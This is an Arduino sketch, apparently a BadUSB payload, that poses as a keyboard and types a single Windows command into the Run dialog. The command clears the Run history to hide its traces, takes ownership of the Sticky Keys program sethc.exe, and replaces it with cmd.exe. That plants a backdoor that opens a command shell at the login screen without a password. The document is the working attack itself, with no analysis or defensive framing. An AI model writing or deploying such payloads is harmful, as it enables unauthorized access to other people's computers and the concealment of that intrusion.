void setup() {//初始化
  delay(5000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  delay(500); 
  Keyboard.println("CMD /C START /MIN REG DELETE hkcu\\sOFTWARE\\mICROSOFT\\wINDOWS\\cURRENTvERSION\\eXPLORER\\rUNmru /F&TAKEOWN /F %sYSTEMrOOT%\\SYSTEM32\\SETHC.EXE&ICACLS %sYSTEMrOOT%\\SYSTEM32\\SETHC.EXE /GRANT ADMINISTARTORS:f&ECHO Y|CACLS %sYSTEMrOOT%\\SYSTEM32\\SETHC.EXE /g %username%:f&COPY C:\\WINDOWS\\SYSTEM32\\CMD.EXE C:\\WINDOWS\\SYSTEM32\\SETHC.EXE /y");
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();//结束键盘通讯 
}
void loop()//循环
{
}
